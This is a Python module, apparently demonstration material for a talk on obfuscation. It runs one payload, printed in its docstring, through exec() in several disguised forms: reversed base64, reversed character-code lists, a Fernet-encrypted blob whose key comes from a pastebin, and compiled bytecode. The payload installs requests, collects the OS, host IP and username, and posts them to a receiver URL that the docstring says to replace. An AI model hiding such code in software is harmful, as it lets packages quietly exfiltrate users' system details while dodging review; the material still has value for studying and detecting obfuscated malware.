"""
Thist module contains various obfuscation techniques used in presentation.
Each method of the ObfuscationTechniques class utilizes the same payload:

import subprocess, sys, socket, platform, os
subprocess.check_call([sys.executable, '-m', 'pip', 'install', '--quiet', 'requests'])
import requests
data={'os_name': platform.system(),'os_ver': platform.release(), 'host_ip': socket.gethostbyname(socket.gethostname()), 'user': os.getlogin()}
try:requests.post('http://0.0.0.0:8080/receiver', json=data)
except Exception as e:print(e)

If you want to change this payload (for example to use different url for
receiver) you need to change it accordingly.
"""

import base64
from . import compiled

class ObfuscationTechniques():
    def base64_payload():
        """
        This method invokes a payload that is a reverse base64 string.
        """
        exec(base64.b64decode(b'==QKlhCdulmcwpTZgMXYg42bpRHclNGeFBCdwV2Y4VmCpEGdhRWPu92cqBCLnIXZ2lWZjVmcvADOwgjOw4CMuAjLw8yL6AHd0h2JoQ3cvBnLzR3clVXclJnO5JHdK0XKo4Wan9Gb0V2ZuM3bgozJyV2c1dCIskSKoUWbh5Gdz9Ga0V2ZuQXZrN2bzhSZtFmb5JGdz9Ga0V2ZuQXZrN2bzBiOnAXafR3cvh2JgwSKoU2chVGblJnLtJ3bmRXYsBHI6ciclZ3Xz92JskCKtVGdzl3cu0mcvZGdhxGcgozJl1WYu91cvdye9EGdhRmCzR3clVXclJHI0J3bw1WaKkSXnMHdzVWdxVmcnACLnQXZpVXct0yJgwyJsxWY0NnbpdCIscCcpB3JgwyJt1yJgwSZsJWY0V3YlhXZuMXeztFKsxWYj91ajVGaj5yczV2YvJHciV3cKM3bgwSby9mZ0FGbwBCL0V2aj92cgwyc5NHIsM3clN2byBnY1NHI0J3bw1Wa'[::-1]).decode('utf-8'))

    def unicode_payload():
        """
        This method invokes a payload that was a string converted into a list
        of Unicode numbers for each character. The list was then reversed
        and embedded into code below.
        """
        exec("".join(chr(i) for i in [10, 41, 101, 40, 116, 110, 105, 114, 112,
        58, 101, 32, 115, 97, 32, 110, 111, 105, 116, 112, 101, 99, 120, 69, 32,
        116, 112, 101, 99, 120, 101, 10, 41, 97, 116, 97, 100, 61, 110, 111,
        115, 106, 32, 44, 39, 114, 101, 118, 105, 101, 99, 101, 114, 47, 48, 56,
        48, 56, 58, 48, 46, 48, 46, 48, 46, 48, 47, 47, 58, 112, 116, 116, 104,
        39, 40, 116, 115, 111, 112, 46, 115, 116, 115, 101, 117, 113, 101, 114,
        58, 121, 114, 116, 10, 125, 41, 40, 110, 105, 103, 111, 108, 116, 101,
        103, 46, 115, 111, 32, 58, 39, 114, 101, 115, 117, 39, 32, 44, 41, 41,
        40, 101, 109, 97, 110, 116, 115, 111,104, 116, 101, 103, 46, 116, 101,
        107, 99, 111, 115, 40, 101, 109, 97, 110, 121, 98, 116, 115, 111, 104,
        116, 101, 103, 46, 116, 101, 107, 99, 111, 115, 32, 58, 39, 112, 105,
        95, 116, 115, 111, 104, 39, 32, 44, 41, 40, 101, 115, 97, 101, 108, 101,
        114, 46, 109, 114, 111, 102, 116, 97, 108, 112, 32, 58, 39, 114, 101,
        118, 95, 115, 111, 39, 44, 41, 40, 109, 101, 116, 115, 121, 115, 46,
        109, 114, 111, 102, 116, 97, 108, 112, 32, 58, 39, 101, 109, 97, 110,
        95, 115, 111, 39, 123, 61, 97, 116, 97, 100, 10, 115, 116, 115, 101,
        117, 113, 101, 114, 32, 116, 114, 111, 112, 109, 105, 10, 41, 93, 39,
        115, 116, 115, 101, 117, 113, 101, 114, 39, 32, 44, 39, 116, 101, 105,
        117, 113, 45, 45, 39, 32, 44, 39, 108, 108, 97, 116, 115, 110, 105, 39,
        32, 44, 39, 112, 105, 112, 39, 32, 44, 39, 109, 45, 39, 32, 44, 101,
        108, 98, 97, 116, 117, 99, 101, 120, 101, 46, 115, 121, 115, 91, 40,
        108, 108, 97, 99, 95, 107, 99, 101, 104, 99, 46, 115, 115, 101, 99, 111,
        114, 112, 98, 117, 115, 10, 115, 111, 32, 44, 109, 114, 111, 102, 116,
        97, 108, 112, 32, 44, 116, 101, 107, 99, 111, 115, 32, 44, 115, 121,
        115, 32, 44, 115, 115, 101, 99, 111, 114, 112, 98, 117, 115, 32, 116,
        114, 111, 112, 109, 105, 10][::-1]))

    def base64_unicode_combined_payload():
        """
        This method invokes a payload that is a reverse base64 string
        converted into a list of Unicode characters. The list was reversed
        and embedded into the code below.
        """
        exec(base64.b64decode("".join(chr(i) for i in [97, 87, 49, 119, 98, 51,
        74, 48, 73, 72, 78, 49, 89, 110, 66, 121, 98, 50, 78, 108, 99, 51, 77,
        115, 73, 72, 78, 53, 99, 121, 119, 103, 99, 50, 57, 106, 97, 50, 86, 48,
        76, 67, 66, 119, 98, 71, 70, 48, 90, 109, 57, 121, 98, 83, 119, 103, 98,
        51, 77, 75, 99, 51, 86, 105, 99, 72, 74, 118, 89, 50, 86, 122, 99, 121,
        53, 106, 97, 71, 86, 106, 97, 49, 57, 106, 89, 87, 120, 115, 75, 70,
        116, 122, 101, 88, 77, 117, 90, 88, 104, 108, 89, 51, 86, 48, 89, 87,
        74, 115, 90, 83, 119, 103, 74, 121, 49, 116, 74, 121, 119, 103, 74, 51,
        66, 112, 99, 67, 99, 115, 73, 67, 100, 112, 98, 110, 78, 48, 89, 87,
        120, 115, 74, 121, 119, 103, 74, 121, 48, 116, 99, 88, 86, 112, 90, 88,
        81, 110, 76, 67, 65, 110, 99, 109, 86, 120, 100, 87, 86, 122, 100, 72,
        77, 110, 88, 83, 107, 75, 97, 87, 49, 119, 98, 51, 74, 48, 73, 72, 74,
        108, 99, 88, 86, 108, 99, 51, 82, 122, 67, 109, 82, 104, 100, 71, 69,
        57, 101, 121, 100, 118, 99, 49, 57, 117, 89, 87, 49, 108, 74, 122, 111,
        103, 99, 71, 120, 104, 100, 71, 90, 118, 99, 109, 48, 117, 99, 51, 108,
        122, 100, 71, 86, 116, 75, 67, 107, 115, 74, 50, 57, 122, 88, 51, 90,
        108, 99, 105, 99, 54, 73, 72, 66, 115, 89, 88, 82, 109, 98, 51, 74, 116,
        76, 110, 74, 108, 98, 71, 86, 104, 99, 50, 85, 111, 75, 83, 119, 103,
        74, 50, 104, 118, 99, 51, 82, 102, 97, 88, 65, 110, 79, 105, 66, 122,
        98, 50, 78, 114, 90, 88, 81, 117, 90, 50, 86, 48, 97, 71, 57, 122, 100,
        71, 74, 53, 98, 109, 70, 116, 90, 83, 104, 122, 98, 50, 78, 114, 90, 88,
        81, 117, 90, 50, 86, 48, 97, 71, 57, 122, 100, 71, 53, 104, 98, 87, 85,
        111, 75, 83, 107, 115, 73, 67, 100, 49, 99, 50, 86, 121, 74, 122, 111,
        103, 98, 51, 77, 117, 90, 50, 86, 48, 98, 71, 57, 110, 97, 87, 52, 111,
        75, 88, 48, 75, 100, 72, 74, 53, 79, 110, 74, 108, 99, 88, 86, 108, 99,
        51, 82, 122, 76, 110, 66, 118, 99, 51, 81, 111, 74, 50, 104, 48, 100,
        72, 65, 54, 76, 121, 56, 119, 76, 106, 65, 117, 77, 67, 52, 119, 79,
        106, 103, 119, 79, 68, 65, 118, 99, 109, 86, 106, 90, 87, 108, 50, 90,
        88, 73, 110, 76, 67, 66, 113, 99, 50, 57, 117, 80, 87, 82, 104, 100, 71,
        69, 112, 67, 109, 86, 52, 89, 50, 86, 119, 100, 67, 66, 70, 101, 71, 78,
        108, 99, 72, 82, 112, 98, 50, 52, 103, 89, 88, 77, 103, 90, 84, 112,
        119, 99, 109, 108, 117, 100, 67, 104, 108, 75, 81, 61, 61][::-1])[::-1]
        ).decode('utf-8'))


    def encryption_payload(pastebin_url: str):
        """
        This method invokes an encrypted payload embedded into the code below.
        The encryption key should be placed in a pastebin. The bastebin
        raw url should be supplied as method's argument.

        Paste this key to pastebin and chage pastebin url:
        2GkrCIFkxKyzUX78xkvQe9jeHKw9QIy6KCPZIz5LzKo=
        """

        import base64, subprocess, sys
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', '--quiet', 'requests', 'cryptography',])
        from requests import get
        from cryptography.fernet import Fernet
        f = Fernet(bytes(get(f"{pastebin_url}").text.encode("utf-8")))
        exec(f.decrypt(b'gAAAAABlTji-x9vIDOFeF7pIV5MXYC1BZiNRHkw8G3bRtIpk_donKR1UxT6_7X-L-gVf-YvVmy1kVbmNxBhvlG1cEOo0wW7XoUj57D1CQJAlzr1JKuLzVrmNEwoYbs4_85Zdii24GqAlh5gzsAfAtVO5QjNDiEjOPTnFx3ddjZCK1wRhdL8wwZfNJnSAlSj7ZVCBalJl7wvlXPR0r-iya0QK6QHFA9LK_qJlFLhAXk7p3JL9ZPRG8fG8Y9eW5JAD_Olkb7UrRUr9YbGHw6kcYzfx5YWnRg3wXU6-su2HHzU8CNW0mTPwqF_npr8KE6nKLJxsm5nS36EeVO9NKStLKw-57h4ERKpV6y7azhRwpjxzFq28M0x6czO_bgQn1OkwHT97xaDHknkW7ic3lJ1g1w4UAsjIZKrlVgt3XkJAjAuMZ3e4E9WSBxklOPftHiohHFtpblsbKD4etguPhrFVLx_n5xFVCVGCBRK6yzNDb0GRMwRl7Ya-NjE='))


    def bytecode_payload():
        """
        This method invokes a payload located in a compiled bytecode file
        """
        compiled.payload()
